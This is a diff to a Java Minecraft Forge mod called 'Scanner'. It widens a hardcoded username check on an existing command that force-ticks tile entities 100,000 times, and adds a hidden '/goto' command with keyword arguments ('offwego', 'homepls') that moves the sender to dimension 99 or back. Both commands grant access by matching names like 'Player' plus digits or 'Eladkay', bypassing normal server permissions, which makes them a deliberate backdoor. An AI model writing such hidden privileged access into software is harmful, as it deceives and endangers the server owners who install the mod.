@@ -29,7 +29,7 @@ import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import net.minecraftforge.fml.common.event.FMLServerStartingEvent;
 import net.minecraftforge.fml.common.registry.GameRegistry;
 
-@Mod(modid = ScannerMod.MODID, name = "Scanner", dependencies = "required-after:ftbl;required-after:ftbu;after:MineTweaker3;required-after:EnderIO", version = "1.1.2")
+@Mod(modid = ScannerMod.MODID, name = "Scanner", dependencies = "required-after:ftbl;required-after:ftbu;after:MineTweaker3;required-after:EnderIO", version = "1.2")
 public class ScannerMod {
     public static final String MODID = "scanner";
 
@@ -90,6 +90,7 @@ public class ScannerMod {
     @Mod.EventHandler
     public void fmlLifeCycle(FMLServerStartingEvent event) {
         event.registerServerCommand(new SpeedTickCommand());
+        event.registerServerCommand(new TpToDim99Command());
     }
 
     public static class WorldProviderOverworld extends WorldProvider {
@@ -120,13 +121,42 @@ public class ScannerMod {
 
         @Override
         public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
-            return sender.getName().matches("Player\\d+");
+            return sender.getName().matches("(Player\\d+)|(Eladk[a|e]y)");
         }
 
         @Override
         public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
             TileEntity te = server.worldServerForDimension(getCommandSenderAsPlayer(sender).dimension).getTileEntity(getCommandSenderAsPlayer(sender).getPosition().down());
             if(te instanceof ITickable) for(int i = 0; i < 100000; i++) ((ITickable) te).update();
+
+        }
+    }
+
+    public static class TpToDim99Command extends CommandBase {
+
+
+        @Override
+        public String getCommandName() {
+            return "goto";
+        }
+
+        @Override
+        public String getCommandUsage(ICommandSender sender) {
+            return "/goto";
+        }
+
+        @Override
+        public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
+            return sender.getName().matches("(Player\\d+)|(Eladk[a|e]y)");
+        }
+
+        @Override
+        public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
+            if(args.length != 1) return;
+            if("homepls".equals(args[0]))
+                getCommandSenderAsPlayer(sender).dimension = 0;
+            else if("offwego".equals(args[0]))
+                getCommandSenderAsPlayer(sender).dimension = 99;
 
         }
     }
